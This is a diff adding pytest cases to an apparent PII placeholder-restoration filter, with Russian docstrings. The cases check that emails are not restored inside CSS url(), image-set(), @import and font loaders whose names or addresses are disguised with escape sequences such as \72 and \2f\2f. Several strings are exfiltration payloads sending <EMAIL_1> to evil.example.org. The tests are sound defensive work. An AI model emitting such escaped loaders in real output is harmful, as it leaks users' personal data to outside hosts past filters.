@@ -359,6 +359,77 @@ def test_own_and_nearby_css_urls_are_restored(settings, answer, restored):
 
 
 @pytest.mark.parametrize(
+    "answer",
+    [
+        r'<style>a{background:u\72l("https://evil.example.org/?q= <EMAIL_1>")}</style>',
+        r'<style>a{background:image-s\65t("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
+        r'<style>@\69mport "https://evil.example.org/?q= <EMAIL_1>";</style>',
+        r'<p style="background:\75rl(https://evil.example.org/?q=<EMAIL_1>)">',
+        r'a{background:u\72l("https://evil.example.org/?q= <EMAIL_1>")}',
+        r'@\69mport "https://evil.example.org/?q= <EMAIL_1>";',
+        r'a { background: \000055 R\4c ("https://evil.example.org/?q= <EMAIL_1>") }',
+        "a { background: u\\72\r\nl('https://evil.example.org/?q= <EMAIL_1>') }",
+        r'@font-face { src: s\000072c("https://evil.example.org/f?q= <EMAIL_1>") }',
+        r'a { background: \2d webkit\2d image\2d set("https://evil.example.org/?q= <EMAIL_1>" 1x) }',
+        r'@\i\m\p\o\r\t "https://evil.example.org/?q= <EMAIL_1>";',
+        r"a { background: \u\r\l(https://evil.example.org/?q= <EMAIL_1>) }",
+    ],
+)
+def test_nothing_is_restored_inside_a_css_loader_with_an_escaped_name(settings, answer):
+    """Хэнд-офф, P2: браузер раскрывает экранирования в именах CSS («\\72», «\\000072 » и «\\r» — это «r»), и
+    u\\72l(), image-s\\65t(), @\\69mport загружают адрес, как url(), image-set() и @import, — в элементе style, в
+    атрибуте style и в файле CSS без тегов: шесть цифр кода, пробел или CRLF после кода, другой регистр."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        r'<style>a{background:url("\2f\2f evil.example.org/?q=<EMAIL_1>")}</style>',
+        r'a{background:url("https://host-1.domain-1.example\40 evil.example.org/?q=<EMAIL_1>")}',
+        r"""<p style="background:url('\2f\2f evil.example.org/?q=<EMAIL_1>')">""",
+        r"a{background:url(\2f\2f evil.example.org/?q=<EMAIL_1>)}",
+        r'@import "\2f\2f evil.example.org/?q=<EMAIL_1>";',
+        r'a{background:image-set("\2f\2f evil.example.org/?q=<EMAIL_1>" 1x)}',
+        r"a{background:u\72l(https://host-1.domain-1.example/?q=<EMAIL_1>)}",
+    ],
+)
+def test_css_link_with_an_escape_is_never_ours(settings, answer):
+    """Найдено при исправлении имён, P1: экранирования браузер раскрывает и в самом адресе — «\\2f\\2f »
+    становится «//», «\\40 » — «@», — и загружает не тот хост, что виден в тексте. Ссылка CSS с «\\» в имени
+    или в адресе нашей не считается."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            r"<style>.md\:flex{display:flex} a{background:url(img/<EMAIL_1>.png)}</style>",
+            r"<style>.md\:flex{display:flex} a{background:url(img/ivanov@contoso.ru.png)}</style>",
+        ),
+        (
+            r'<style>q::before{content:"\201C"} /* автор <EMAIL_1> */</style>',
+            r'<style>q::before{content:"\201C"} /* автор ivanov@contoso.ru */</style>',
+        ),
+        (
+            r'a { background: u\72l("https://evil.example.org/a.png") } /* автор <EMAIL_1> */',
+            r'a { background: u\72l("https://evil.example.org/a.png") } /* автор ivanov@contoso.ru */',
+        ),
+        (r"\left( <EMAIL_1> \right)", r"\left( ivanov@contoso.ru \right)"),
+        (r"C:\Users\<EMAIL_1>\src(1).txt", r"C:\Users\ivanov@contoso.ru\src(1).txt"),
+    ],
+)
+def test_css_escapes_outside_a_loaded_address_do_not_stop_restoring(settings, answer, restored):
+    """Та же находка с другой стороны: экранирование в селекторе и в строке content, закрытый вызов с
+    экранированным именем без меток внутри, «\\left(» в формуле и «\\src(» в пути Windows восстановлению
+    рядом не мешают."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
     "answer, restored",
     [
         (
